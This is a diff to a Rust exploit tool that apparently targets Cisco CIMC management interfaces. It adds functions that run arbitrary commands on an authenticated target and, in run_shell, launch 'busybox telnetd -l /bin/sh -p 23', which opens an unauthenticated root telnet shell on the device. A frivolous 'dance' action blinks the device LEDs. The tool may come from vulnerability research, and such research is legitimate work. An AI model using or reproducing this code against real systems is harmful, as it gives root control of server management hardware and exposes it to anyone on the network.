@@ -3,11 +3,12 @@ use reqwest;
 use elementtree::Element;
 use anyhow::{Error, Result, Context};
 use crate::libs::arguments::Actions;
-use std::collections::HashMap;
+use std::{collections::HashMap, time::Duration};
 use reqwest::blocking::Client;
 use crate::libs::encryption::hash_fnv32;
 use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
 use rand::Rng;
+use std::io::stdin;
 
 #[derive(Clone,Debug)]
 pub struct Authenticated {
@@ -310,25 +311,69 @@ pub fn run_test(target: &str,authenticated: &Authenticated,proxy: Option<&str>) 
     Ok(())
 }
 
-pub fn run_command() -> Result<()>{
-    todo!();
+pub fn run_command(target: &str,authenticated: &Authenticated,cmd: Option<&str>,proxy: Option<&str>) -> Result<()> {
+    
+    let cmd = cmd.context("Need to provide a command when using action cmd")?;
+
+    println!("CIMC:/$ {cmd}");
+    let out = exec(target,authenticated,cmd,proxy);
+    match out {
+    Ok(output) => println!("{output}"),
+    Err(err) => println!("something went wrong: {err}")
+
+    }
+    Ok(())
 }
 
-pub fn run_shell() -> Result<()>{
-    todo!();
+pub fn run_shell(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> {
+    println!("Warning: This will open up port 23 on the Cisco CIMC interface connected to the network.\nThe shell will provide root access with NO authentication.");
+    let mut input = String::new();
+    stdin().read_line(&mut input)?;
+    
+    if input.to_lowercase() == "yes" || input.to_lowercase() == "y" {
+        let cmd = "busybox telnetd -l /bin/sh -p 23";
+        println!("CIMC:/$ {cmd}");
+        let out = exec(target,authenticated,cmd,proxy);
+        match out {
+            Ok(output) => println!("Success: {output}"),
+            Err(err) => println!("Something went wrong: {err}")
+        }
+    }
+    else {
+        println!("no confirmation, aborting...");
+    }
+
+    Ok(())
 }
 
-pub fn run_dance() -> Result<()>{
-    todo!();
+pub fn run_dance(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> {
+    let cmd = "sh -c 'for i in 1 2 3 4 5 6 7 8 9 10; do /etc/plumas1/etc/scripts/LED.sh ON && sleep 0.1 && /etc/plumas1/etc/scripts/LED.sh OFF && sleep 0.1; done'";
+    println!("");
+    let out = exec(target,authenticated,cmd,proxy);
+    match out {
+        Ok(output) => println!("Success: {output}"),
+        Err(err) => println!("Something went wrong: {err}")
+    }
 
+    let sleep_seconds = Duration::from_millis(500);
+    println!("\\^o^/");
+    for _ in 0..8 {
+        println!("\\^o^/");
+        std::thread::sleep(sleep_seconds);
+        println!("/^o^\\");
+        std::thread::sleep(sleep_seconds);
+    }
+    println!("/^o^\\");
+
+    Ok(())
 }
 
-pub fn handle_action(action: &Actions,target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> { 
+pub fn handle_action(action: &Actions,target: &str,authenticated: &Authenticated,cmd: Option<&str>,proxy: Option<&str>) -> Result<()> { 
     match action {
         Actions::Test => run_test(target, authenticated, proxy)?,
-        Actions::Cmd => run_command()?,
-        Actions::Shell => run_shell()?,
-        Actions::Dance => run_dance()?
+        Actions::Cmd => run_command(target, authenticated,cmd,proxy)?,
+        Actions::Shell => run_shell(target, authenticated, proxy)?,
+        Actions::Dance => run_dance(target, authenticated, proxy)?
     }
     Ok(())
 }
